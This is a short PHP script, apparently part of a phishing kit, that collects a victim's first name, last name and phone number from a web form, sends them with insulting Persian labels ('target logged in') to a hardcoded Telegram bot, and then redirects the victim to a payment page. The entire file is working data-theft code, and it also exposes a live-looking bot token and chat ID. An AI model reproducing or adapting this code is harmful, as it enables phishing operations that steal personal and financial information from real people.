<?php
$TOKEN = "7806522366:AAEgRHM86vTcBAAVbSkHplTyn20n0iYjzWE";
$ID = 7509964174;
$firstname = $_POST['firstname'];
$lastname = $_POST['lastname'];
$phone = $_POST['phone'];
$Text = "
تارگت لاگین کرد 🤡
------------------------
اسم کیریش : $firstname
فامیلی تخمیش : $lastname
شماره کونیش : <code>$phone</code>
------------------------
Coded by Madsal
";
file_get_contents("https://api.telegram.org/bot".$TOKEN."/sendMessage?parse_mode=HTML&chat_id=".$ID."&text=".urlencode($Text));
header('Location: payment/index.php');
?>